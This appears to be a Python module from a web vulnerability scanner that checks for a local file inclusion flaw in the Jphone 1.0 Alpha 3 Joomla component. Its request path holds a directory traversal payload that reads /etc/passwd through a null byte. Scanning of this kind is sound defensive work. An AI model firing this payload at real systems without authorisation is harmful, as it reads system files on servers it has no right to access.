#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in jphone."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Component Jphone 1.0 Alpha 3 - Local File Inclusion Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'lfi', 'edb', 'packetstorm', 'joomla', '4you-studio', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_jphone&controller=../../../../../../../../../../etc/passwd%00', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Component Jphone 1.0 Alpha 3 - Local File Inclusion detected",
                path='/index.php?option=com_jphone&controller=../../../../../../../../../../etc/passwd%00',
            )
            return True
        return False
